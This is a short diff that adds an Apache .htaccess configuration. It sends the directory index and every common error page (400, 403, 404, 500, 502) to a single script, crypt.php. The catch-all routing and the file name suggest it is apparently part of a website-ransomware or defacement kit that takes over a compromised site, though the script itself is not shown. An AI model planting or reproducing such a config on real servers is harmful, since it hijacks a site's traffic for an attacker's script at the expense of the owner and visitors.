@@ -1,0 +1,6 @@
+DirectoryIndex crypt.php
+						ErrorDocument 400 /crypt.php
+						ErrorDocument 403 /crypt.php
+						ErrorDocument 404 /crypt.php
+						ErrorDocument 500 /crypt.php
+						ErrorDocument 502 /crypt.php
